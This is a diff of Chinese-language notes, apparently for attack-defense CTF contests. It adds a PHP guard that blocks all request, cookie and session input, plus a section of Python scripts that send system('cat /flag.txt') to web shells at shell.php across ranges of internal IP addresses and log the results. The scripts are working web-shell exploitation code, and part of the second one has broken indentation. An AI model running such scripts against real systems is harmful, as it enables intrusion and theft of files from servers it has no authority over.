@@ -2,11 +2,24 @@
 ```php
 <?php
 foreach($_REQUEST as $f){
-    if(preg_match('/\S/m',$f))
-    {
-        die('flag{you_will_get_it}');
+    if(strlen($f)>0){
+        die('我是你爹');
+        phpinfo();
     }
-}>
+}
+foreach($_COOKIE as $f){
+    if(strlen($f)>0){
+        die('我是你爸}');
+        phpinfo();
+    }
+}
+foreach($_SESSION as $f){
+    if(strlen($f)>0){
+        die('我是你爷爷');
+        phpinfo();
+    }
+}
+?>
 ```
 
 写在/tmp下，然后执行命令
@@ -20,6 +33,34 @@ foreach($_REQUEST as $f){
 为什么要用require而不用include呢，首先require一定会执行并且遇到错误无法执行，include遇到错误直接跳过，其次require无论位置在哪都会首先执行，include则是遇到了才会执行，并且require是无条件包含，所以一定要用require防止包含失效被打穿
 
 # 一句话木马脚本
+```python
+import requests
+import re
+
+ur='http://10.30.'
+url='.116/shell.php'
+for i in range(1,2,1):
+    i=str(i)
+    sb=ur+i+url
+    pay={'shell':"system('cat /flag.txt');"}
+    try:
+        a=requests.post(url=sb,data=pay,timeout=2).text
+        b=re.findall(r'\w{15,60}',a)
+    except:
+        b=''
+    if len(b)>0:
+        for i in b:
+            with open ("1.txt","a+") as f:
+                f.write(sb+' '+i+'\n')
+import requests
+for i in range(101,130):
+payload={"shell":"system('cat /flag.txt')"}
+    try:
+        a=requests.post(url="http://172.20."+str(i)+".101/shell.php",data=payload).text
+        print(a)
+    except:
+        pass
+```
 `(看好是post还是get,如果是get自己修改下面命令注入的脚本)`
 ```python
 import requests
